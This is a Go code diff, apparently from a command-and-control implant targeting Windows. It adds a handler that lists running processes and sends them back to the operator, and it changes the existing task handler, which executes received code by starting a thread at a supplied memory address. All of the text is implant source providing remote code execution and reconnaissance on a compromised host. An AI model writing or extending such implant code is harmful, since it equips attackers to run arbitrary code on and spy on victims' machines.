@@ -13,6 +13,7 @@ var (
 	windowsHandlers = map[string]interface{}{
 		"task":       taskHandler,
 		"remoteTask": remoteTaskHandler,
+		"psReq":      psHandler,
 	}
 )
 
@@ -21,7 +22,7 @@ func getSystemHandlers() map[string]interface{} {
 }
 
 // ---------------- Handlers ----------------
-func taskHandler(data []byte) {
+func taskHandler(send chan pb.Envelope, data []byte) {
 
 	task := &pb.Task{}
 	err := proto.Unmarshal(data, task)
@@ -38,17 +39,47 @@ func taskHandler(data []byte) {
 	}
 	log.Printf("Creating local thread with start address: %v", addr)
 	createThread.Call(0, 0, addr, 0, 0, 0)
-	//syscall.Syscall(addr, 0, 0, 0, 0)
 }
 
-func remoteTaskHandler(data []byte) {
+func remoteTaskHandler(send chan pb.Envelope, data []byte) {
 	task := &pb.Task{}
 	err := proto.Unmarshal(data, task)
 	if err != nil {
 		log.Printf("Error decoding message: %v", err)
 		return
 	}
+}
 
+func psHandler(send chan pb.Envelope, data []byte) {
+	psListReq := &pb.ProcessListReq{}
+	err := proto.Unmarshal(data, psListReq)
+	if err != nil {
+		log.Printf("Error decoding message: %v", err)
+		return
+	}
+	procs, err := Processes()
+	if err != nil {
+		log.Printf("Failed to list procs %v", err)
+	}
+
+	psList := &pb.ProcessList{
+		Id:        psListReq.Id,
+		Processes: []*pb.Process{},
+	}
+
+	for _, proc := range procs {
+		psList.Processes = append(psList.Processes, &pb.Process{
+			Pid:        int32(proc.Pid()),
+			Ppid:       int32(proc.PPid()),
+			Executable: proc.Executable(),
+		})
+	}
+	data, _ = proto.Marshal(psList)
+	envelope := pb.Envelope{
+		Type: "psList",
+		Data: data,
+	}
+	send <- envelope
 }
 
 // ---------------- Platform Code ----------------
